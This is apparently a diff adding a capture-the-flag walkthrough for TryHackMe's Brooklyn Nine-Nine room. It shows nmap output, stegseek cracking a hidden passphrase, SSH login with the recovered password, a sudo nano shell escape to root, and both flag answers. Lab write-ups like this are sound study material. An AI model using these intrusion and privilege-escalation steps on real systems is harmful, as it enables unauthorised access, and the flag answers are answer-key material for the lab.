@@ -1,0 +1,74 @@
+https://tryhackme.com/room/brooklynninenine
+
+Machine IP: 10.145.131.24
+Attack Machine: Kali VM on host machine with OpenVPN profile
+
+# commands
+## comments
+------------------------------------------------------------------------------------------------
+Q: User flag
+A: ee11cbb19052e40b07aac0ca060c23ee
+
+# nmap -A -T5 10.145.131.24
+## PORT   STATE SERVICE VERSION
+## 21/tcp open  ftp     vsftpd 3.0.3
+## | ftp-syst: 
+## |   STAT: 
+## | FTP server status:
+## |      Connected to ::ffff:192.168.138.43
+## |      Logged in as ftp
+## |      TYPE: ASCII
+## |      No session bandwidth limit
+## |      Session timeout in seconds is 300
+## |      Control connection is plain text
+## |      Data connections will be plain text
+## |      At session startup, client count was 2
+## |      vsFTPd 3.0.3 - secure, fast, stable
+## |_End of status
+## | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+## |_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+## 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+## | ssh-hostkey: 
+## |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+## |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+## |_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+## 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+## |_http-title: Site doesn't have a title (text/html).
+## |_http-server-header: Apache/2.4.29 (Ubuntu)
+
+## Let's check out the web server
+## Just seeing a photo of Brooklyn Nine-Nine
+## Inspecting the page shows a message about steganography, so let's download the image and check it out: http://10.145.131.24/brooklyn99.jpg
+
+## When trying steghide without a catch-phrase, wasn't getting much, so moved on to stegseek
+
+# stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+
+## [i] Found passphrase: "admin"
+## [i] Original filename: "note.txt".
+## [i] Extracting to "brooklyn99.jpg.out".
+
+# cat brooklyn99.jpg.out
+
+## Holts Password:
+## fluffydog12@ninenine
+##
+## Enjoy!!
+
+# ssh holt@10.145.131.24
+# fluffydog12@ninenine
+# cat user.txt
+
+Q: Root flag
+A: 63a9f0ea7bb98050796b649e85481845
+
+# sudo -l
+## looks like we can sudo with /bin/nano, let's head over to GTFObins: https://gtfobins.org/gtfobins/nano/
+
+# sudo nano
+## ctrl + r, then ctrl + x
+# reset; sh 1>&0 2>&0
+
+# whoami
+## root
+# cat /root/root.txt
